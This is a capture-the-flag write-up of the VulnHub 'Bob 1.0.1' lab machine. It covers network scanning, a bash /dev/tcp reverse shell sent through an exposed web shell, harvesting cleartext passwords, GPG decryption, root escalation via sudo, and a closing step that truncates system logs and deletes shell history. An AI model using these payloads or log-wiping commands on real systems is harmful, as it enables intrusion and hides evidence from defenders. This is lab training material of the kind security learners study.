## VulnHub Writeup: Bob 1.0.1

• Target IP: 192.168.56.103

• Attacker IP: 192.168.56.102

• Platform: Debian Linux

• Objective: Capture the root flag (flag.txt)

## 🖥️ Network Architecture

The engagement was conducted within an isolated virtual lab environment on a dedicated host-only network (`192.168.56.0/24`). This setup ensured that no traffic or exploitation activity leaked onto the production network.

<img width="1024" height="559" alt="image" src="https://github.com/user-attachments/assets/ef923cac-15fb-4626-810f-a6a1a6567d0b" />





### Machine Configuration

| Machine Role | Operating System | IP Address |
| :--- | :--- | :--- |
| **Attacker** | Kali Linux | `192.168.56.102` |
| **Target** (Bob 1.0.1) | Debian Linux | `192.168.56.103` |

## 🛠️ Stage 1: Reconnaissance ##
To identify the target's IP address on the local virtual network, I performed an ARP sweep. Sweep the network for live hosts

```bash
sudo netdiscover -r 192.168.56.0/24
```
<img width="639" height="178" alt="sudo netdiscover -r 192 168 56 024" src="https://github.com/user-attachments/assets/a91f8b89-2b59-4a67-af7e-f9c48c4edd92" />


-r: Specifies the range to scan in CIDR notation.

Result: Identified the target at 192.168.56.103.

## 🔍 Stage 2: Scanning ##

I used nmap to identify open ports, service versions, and run default scripts. Comprehensive port scan

```bash
sudo nmap -sC -sV -p- -T4 192.168.56.103
```
<img width="767" height="377" alt="sudo nmap -sC -sV -p- -T4 192 168 56 103" src="https://github.com/user-attachments/assets/1ea1db9f-4c47-48f8-846c-21214d4b242c" />


## Flag Breakdown :

• -sC : Runs default Nmap scripts to check for common misconfigurations.

• -sV : Probes open ports to determine service and version information.

• -p- : Scans all 65,535 ports.

• -T4 : Sets the timing template to "Aggressive" for faster execution.

Findings:
| Port | State | Service | Version | Key Findings |
| :--- | :--- | :--- | :--- | :--- |
| **80** | Open | HTTP | Apache httpd 2.4.25 (Debian) | Enumerated `robots.txt` disclosing `/dev_shell.php`, `/lat_memo.html`, `/login.php` and `/passwords.html`. |
| **25468** | Open | SSH | OpenSSH 7.4p1 (Protocol 2.0) | Discovered SSH on a non-standard port; used for lateral movement and root pivot. |


<img width="1918" height="942" alt="login php" src="https://github.com/user-attachments/assets/fa6b96e6-a183-4d2c-992a-0c09aac4b60e" />

<img width="1918" height="940" alt="passwords html" src="https://github.com/user-attachments/assets/1af8c6ed-3092-4204-b5f9-2681de51b80e" />

<img width="1919" height="940" alt="dev_shell php" src="https://github.com/user-attachments/assets/345df718-eb93-4fd6-8dbc-aca95b46f710" />

<img width="1917" height="943" alt="lat_memo html" src="https://github.com/user-attachments/assets/3e558121-900b-4dbc-b1d9-5a685a9cdca6" />



| Page Path | Status / Content | Security Significance |
| :--- | :--- | :--- |
| `/login.php` | **404 Not Found** | Endpoint does not exist. Dismissed as a vector. |
| `/passwords.html` | **Text Leak** | Confirmed historical credential leaks; suggested passwords had been moved to the filesystem. |
| `/lat_memo.html` | **Intel Leak** | Disclosed an unprotected web shell and the use of a legacy Windows-ported filter. |
| `/dev_shell.php` | **Functional RCE** | **Primary Entry Point.** A functional administrative tool providing a direct interface to the OS. |

**Why I decided to use dev_shell.php**
The decision to use dev_shell.php was based on three primary factors:

A. Direct Remote Code Execution (RCE)
Unlike the other pages, which are static (HTML) or non-existent (404), dev_shell.php is an active script designed to process commands. It acts as a bridge between the web browser and the server's terminal, which is exactly what an attacker needs to gain a foothold.

B. The "Windows Filter" Weakness
In lat_memo.html, Bob admits he used a filter from an old Windows server. Windows and Linux handle command characters (like /, \, ;, and &) very differently. A filter designed for Windows often fails to block common Linux shell operators, making the "protection" Bob mentioned practically useless against a Linux-based reverse shell payload.

C. Path of Least Resistance
Since I already have the URL for the shell, I don't need to perform a "Brute Force" attack on a login page or look for complex memory corruption vulnerabilities. The vulnerability is "exposed by design"—the developer literally built a back door for me.

This engagement followed the **PTES (Penetration Testing Execution Standard)** methodology to ensure a systematic and professional compromise of the target.

### Methodology Phases
1. **Intelligence Gathering**: Identifying the target IP on the subnet.
2. **Vulnerability Analysis**: Mapping the attack surface via Nmap and directory enumeration.
3. **Exploitation**: Leveraging RCE on the web shell to establish a foothold.
4. **Post-Exploitation**: Lateral movement via credential harvesting and vertical escalation to Root.
5. **Clean Up**: Sanitizing logs and history to minimize the forensic footprint.

## 🔓 Stage 3: Gaining Access ##
Investigation of /lat_memo.html indicated that the developer implemented a weak command filter on a web shell located at /dev_shell.php.

1.  **Listener Setup**:

I started a Netcat listener on my Kali machine.

```Bash
nc -lvnp 4444
```
## Flag Breakdown :

• -l : Listen mode.

• -v : Verbose.

• -n : No DNS resolution.

• -p : Local port.

2.  **Reverse Shell Execution**:

I sent a Bash reverse shell payload through the vulnerable web shell input:
    
```
bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'
```
<img width="1918" height="967" alt="bash -c &#39;bash -i   devtcp192 168 56 1024444 0 1&#39;" src="https://github.com/user-attachments/assets/1bd7314f-f688-4f67-bf44-559c0b167877" />

    
**Result**: Initial access gained as the service account **`www-data`**.


## 📈 Stage 4: Privilege Escalation ##

### Lateral Movement (User Pivot)
I searched the system for sensitive files and identified a hidden password store.

# Search for password-related files
```Bash
www-data@Milburg-High:/var/www/html$ find / -name "*password*" -type f 2>/dev/null
```
<img width="659" height="807" alt="www-data@Milburg-Highvarwwwhtml$ find  -name password -type f 2devnull 1" src="https://github.com/user-attachments/assets/fe6f61d7-98b8-443f-8f36-66f2d70e1c14" />

<img width="511" height="798" alt="www-data@Milburg-Highvarwwwhtml$ find  -name password -type f 2devnull 2" src="https://github.com/user-attachments/assets/884633ea-413c-4a92-80e0-81e16aec68a5" />


```Bash
www-data@Milburg-High:/var/www/html$ cat /home/bob/.old_passwordfile.html
```
<img width="513" height="119" alt="www-data@Milburg-Highvarwwwhtml$ cat homebob old_passwordfile html" src="https://github.com/user-attachments/assets/b91ec707-bd57-4023-a9c7-0d41cf7b1cbe" />


Findings:

• Located /home/bob/.old_passwordfile.html, which contained credentials for jc (Qwerty) and seb (T1tanium_Pa$$word_Hack3rs_Fear_M3).

### Lateral Movement (Pivoting to SSH)

I harvested credentials from a hidden file at /home/bob/.old_passwordfile.html. Using these, I upgraded from the unstable web shell to a secure SSH session.

```bash
ssh seb@192.168.56.103 -p 25468
```
<img width="502" height="261" alt="ssh seb@192 168 56 103 -p 25468" src="https://github.com/user-attachments/assets/f20239e5-7ddf-43c8-a828-d561961fa5b6" />


• seb password : T1tanium_Pa$$word_Hack3rs_Fear_M3

Result: Authenticated as seb and later identified Elliot's password (theadminisdumb) in /home/elliot/theadminisdumb.txt.

• Pivoting: I established a stable SSH connection as seb on port 25468 and later used su jc.

```bash
seb@Milburg-High:~$ su jc
```

• jc password : Qwerty

```bash
jc@Milburg-High:/home$ ls
bob elliot jc seb
```

• This is good because we can directly list all the user.

```bash
jc@Milburg-High:/home$ cd elliot
jc@Milburg-High:/home/elliot$ ls
Desktop  Documents  Downloads  Music  Pictures  Templates  theadminisdumb.txt  Videos
jc@Milburg-High:/home/elliot$ cat theadminisdumb.txt
```
<img width="1902" height="143" alt="cat password for elliot" src="https://github.com/user-attachments/assets/622516f4-4df6-457d-9d90-bfcd07bc4f83" />


I also found Elliot's password (theadminisdumb) in /home/elliot/theadminisdumb.txt.  

```bash
jc@Milburg-High:/home/elliot$ ls -laR /home/bob /home/elliot 2>/dev/null
```

After run this command, it will spit out 156 files in `/home/bob` and `/home/elliot`. File `notes.sh` was found.

`notes.sh` file location : `/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_lookie_In_Here`
<img width="400" height="67" alt="notes sh" src="https://github.com/user-attachments/assets/81f33722-11dd-468e-909b-eb0183d1d399" />


```bash
jc@Milburg-High:/home/elliot$ cd /home
jc@Milburg-High:/home$ cd bob
jc@Milburg-High:/home/bob$ cd Documents
jc@Milburg-High:/home/elliot/Documents$ cd Secret
jc@Milburg-High:/home/elliot/Documents/Secret$ cd Keep_Out
jc@Milburg-High:/home/elliot/Documents/Secret/Keep_out$ cd Not_Porn
jc@Milburg-High:/home/elliot/Documents/Secret/Keep_out/Not_Porn$ cd No_Lookie_In_Here
jc@Milburg-High:/home/elliot/Documents/Secret/Keep_out/Not_Porn/No_Lookie_In_Here$ ls
notes.sh
```

```bash
cat notes.sh
```
<img width="958" height="298" alt="cat notes sh" src="https://github.com/user-attachments/assets/65364e00-7f2a-4f68-81f7-211ebb6d5c91" />


acrostic passphrase HARPOCRATES was found inside `notes.sh`

## Flag Breakdown :

• ls: The base command used to list directory contents.

• /home/bob /home/elliot: These are the specific target paths the command is looking into.

• 2>/dev/null: This redirects "stderr" (error messages) to a virtual "black hole." This is critical during penetration testing to hide "Permission Denied" errors, leaving you with only the files you actually have the rights to see.

This command is a recursive directory listing focused on the home directories of the users bob and elliot.

It was used to uncover hidden files, scripts, and sensitive documentation buried deep within the filesystem.  

Next I discover `login.txt.gpg` in `/home/bob/Documents` but when i try to read this file by using cat it only show raw, binary data of an encrypted file.


<img width="1504" height="204" alt="cat login txt gpg" src="https://github.com/user-attachments/assets/2b3a903e-4ca2-4af5-bd49-7973f6d4f7c2" />


When you use the cat command on a .gpg file, you are telling the terminal to display its contents as plain text. However, because the file is encrypted, the data consists of binary characters that the terminal cannot translate into readable letters, resulting in the "gibberish" or symbols


## Vertical Escalation (Root)

Passphrase Extraction: I discovered a nested script at /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh. 

By taking the first letter of each sentence, I deciphered the acrostic passphrase HARPOCRATES.  

Decryption: I used this passphrase to decrypt Bob's password vault.
```Bash
gpg --batch --passphrase HARPOCRATES -d /home/bob/Documents/login.txt.gpg
```
<img width="1002" height="83" alt="gpg --batch --passphrase HARPOCRATES -d homebobDocumentslogin txt gpg" src="https://github.com/user-attachments/assets/11558bad-aa4c-4da8-8c46-4fbc195816db" />


Result: Decrypted Bob's password: b0bcat_.  

Root Shell:
```Bash
su bob
```
Password : b0bcat_

```Bash
sudo -i
```
<img width="644" height="101" alt="enter root" src="https://github.com/user-attachments/assets/c8fcca49-28c6-457d-a902-64ef86926012" />


## Flag Breakdown :

• -i: Simulates a login to provide the root environment.  

```Bash
root@Milbirg-High:`# id
uid=0(root) gid=0(root) groups=0(root)
```
<img width="448" height="41" alt="root id" src="https://github.com/user-attachments/assets/1f6dbe43-5e4a-4bf9-be68-ce7fcf0b1230" />


Seeing uid=0(root) gid=0(root) groups=0(root) is the "holy grail" for a penetration tester. 

It signifies that you have successfully achieved Full System Compromise and are operating with the highest level of administrative authority on the Linux system.

**Technical breakdown**: 

1. uid=0(root)
   • UID (User ID): This is a unique numerical value assigned by Linux to every user.

   • The "0" Value: In the Linux kernel, the ID 0 is hardcoded to the root account.

   • Meaning: You are no longer a standard user with restricted access; you are the "Superuser." You can read, modify, or delete any file on the system, regardless of its original permissions.

2. gid=0(root)
   • GID (Group ID): This is the ID of the user's primary group.

   • Meaning: You belong to the root group, which typically shares administrative ownership of critical system binaries and configuration files.

3. groups=0(root)
   • Groups: This lists all supplementary groups the user belongs to.

   • Meaning: Being in the root group allows you to execute administrative commands and access system hardware that is restricted to standard users. 

```Bash
root@Milbirg-High:`# cat flag.txt
hey n there flag.txt
```
<img width="378" height="39" alt="cat flag txt" src="https://github.com/user-attachments/assets/88de6f42-0de7-45ac-9523-a9f446272e69" />


Flag: Captured flag.txt in the /root directory.  

## 🔑 Harvested Credentials

| User | Password | Discovery Method |
| :--- | :--- | :--- |
| **jc** | `Qwerty` | Cleartext in `/home/bob/.old_passwordfile.html`[cite: 1] |
| **seb** | `T1tanium_Pa$$word_Hack3rs_Fear_M3` | Cleartext in `/home/bob/.old_passwordfile.html`[cite: 1] |
| **elliot** | `theadminisdumb` | Plaintext note in `/home/elliot/theadminisdumb.txt`[cite: 1] |
| **bob** | `b0bcat_` | GPG Decryption (Passphrase: `HARPOCRATES`)[cite: 1] |
| **root** | N/A | Vertical Escalation via `sudo -i` as Bob[cite: 1] |
## 🛡️ Stage 5: Maintain Access ##
Persistence is achieved via the non-standard SSH service (Port 25468) using the recovered administrator credentials for bob.

## 🧹 Stage 6: Clear Tracks ##

To remove forensic evidence of the intrusion, I sanitized the system logs and command history.

# Truncate system logs
```Bash
truncate -s 0 /var/log/auth.log
truncate -s 0 /var/log/apache2/access.log
truncate -s 0 /var/log/apache2/error.log
```
<img width="579" height="184" alt="truncate" src="https://github.com/user-attachments/assets/549929d8-3b13-4a70-9378-3da03a8acf61" />


# Clear command history
```Bash
history -c && rm /root/.bash_history
```
<img width="581" height="56" alt="history" src="https://github.com/user-attachments/assets/9af25f8e-8e13-406f-8b2c-453c6112db0e" />


## Flag Breakdown :

history -c: Clears the current session's history buffer.  
truncate -s 0: Empties the log files without deleting them, preventing service errors while removing the forensic trail. 

• auth.log: Size 0 (Evidence of SSH/Sudo activity removed).  

• access.log: Size 0 (Evidence of web-based RCE removed).  

• .bash_history: Deleted (Evidence of manual commands removed).

• error.log: Hides how you exploited the vulnerabilities.

### Tools Utilized

| Phase | Tool | Purpose |
| :--- | :--- | :--- |
| **Reconnaissance** | `netdiscover` | Identifying the target IP address via ARP requests. |
| **Scanning** | `nmap` | Mapping open ports and service version detection. |
| **Initial Access** | `Netcat (nc)` | Setting up a local listener to intercept the reverse shell. |
| **Exploitation** | `Bash` | Executing a `/dev/tcp` reverse shell payload. |
| **Enumeration** | `find` / `ls` | Recursively searching the filesystem for hidden credentials. |
| **Lateral Movement** | `SSH` / `su` | Pivoting between users using harvested credentials. |
| **Privilege Escalation** | `GPG` | Decrypting password vaults using discovered passphrases. |
| **Housekeeping** | `truncate` | Zeroing out system logs (`auth.log`, `access.log`). |

# Final Status: Root Compromised. Tracks Cleared. 
